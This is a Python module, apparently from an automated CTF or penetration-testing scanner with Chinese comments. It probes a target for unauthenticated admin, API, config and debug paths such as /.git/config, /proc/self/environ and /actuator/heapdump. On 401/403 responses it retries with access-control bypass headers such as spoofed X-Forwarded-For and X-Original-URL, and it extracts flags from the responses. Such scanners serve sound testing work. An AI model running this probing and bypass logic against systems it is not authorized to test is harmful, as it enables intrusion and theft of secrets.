"""未授权访问检查：常见管理/API 路径 + 常见鉴权头/参数绕过尝试。"""
from __future__ import annotations

from ..common import Candidate, body_of, extract_flag, get

# (路径, 期望语义：200 且非登录页即异常)
PATHS = [
    "/admin", "/admin/", "/administrator", "/manage", "/manager",
    "/api/admin", "/api/admin/flag", "/api/v1/admin", "/api/flag",
    "/api/users", "/api/v1/users", "/api/v1/user", "/api/user",
    "/api/v1/flag", "/flag", "/flag.txt", "/internal", "/console",
    "/debug", "/dev", "/test", "/backup", "/config", "/config.json",
    "/api/config", "/.git/config", "/WEB-INF/web.xml", "/proc/self/environ",
    "/swagger-ui.html", "/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/heapdump",
    "/druid/index.html", "/nacos/", "/api/v1/auth/users", "/api/v1/systems/user",
]

# 常见鉴权绕过头（若路径 401/403，用这些头重试）
BYPASS_HEADERS = [
    {"X-Admin": "1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]


def run(ctx) -> list[Candidate]:
    out: list[Candidate] = []
    base = ctx["base"].rstrip("/")
    # LLM 发现的隐藏路径优先，其次是内置路径（去重保顺序）
    all_paths = list(dict.fromkeys(ctx.get("extra_paths", []) + PATHS))
    for path in all_paths:
        if ctx["time_left"]() <= 0:
            break
        resp = get(base + path, ctx["timeout"])
        if resp is None:
            continue
        status = resp.status_code
        body = body_of(resp)
        flag = extract_flag(body)
        if flag:
            out.append(Candidate(
                type="unauth", url=base + path,
                request=f"GET {path}",
                response=body[:300],
                impact=f"未授权访问 {path} 直接泄露 flag",
                confidence=0.95, value=flag,
                confirm={"note": "直接 GET 命中" if resp.status_code == 200 else f"http {status}"},
            ))
            continue
        # 200 且响应有实质内容且非登录页 → 可疑未授权
        if status == 200 and _substantial(body):
            out.append(Candidate(
                type="unauth", url=base + path,
                request=f"GET {path}",
                response=body[:300],
                impact=f"未授权访问 {path} 返回敏感内容",
                confidence=0.5,
            ))
        # 401/403 → 尝试鉴权头绕过
        elif status in (401, 403):
            for h in BYPASS_HEADERS:
                r2 = get(base + path, ctx["timeout"], headers=h)
                if r2 is None:
                    continue
                b2 = body_of(r2)
                f2 = extract_flag(b2)
                if f2:
                    out.append(Candidate(
                        type="unauth", url=base + path,
                        request=f"GET {path} (+{list(h.keys())[0]})",
                        response=b2[:300],
                        impact=f"鉴权头绕过 {list(h.keys())[0]} 获取 flag",
                        confidence=0.95, value=f2,
                        confirm={"note": f"header {list(h.keys())[0]} bypass"},
                    ))
                    break
                if r2.status_code == 200 and _substantial(b2):
                    out.append(Candidate(
                        type="unauth", url=base + path,
                        request=f"GET {path} (+{list(h.keys())[0]})",
                        response=b2[:300],
                        impact=f"鉴权头 {list(h.keys())[0]} 绕过访问 {path}",
                        confidence=0.7,
                    ))
                    break
    return out


def _substantial(body: str) -> bool:
    """有实质内容的响应（排除登录页/错误页/空页）。"""
    b = body.lower().strip()
    if not b:
        return False
    if b.startswith("<!doctype html") or b.startswith("<html"):
        if "login" in b or "password" in b or "登录" in b:
            return False
    markers = ("forbidden", "denied", "401", "403", "unauthorized", "not found", "404")
    return not any(b.startswith(m) for m in markers)
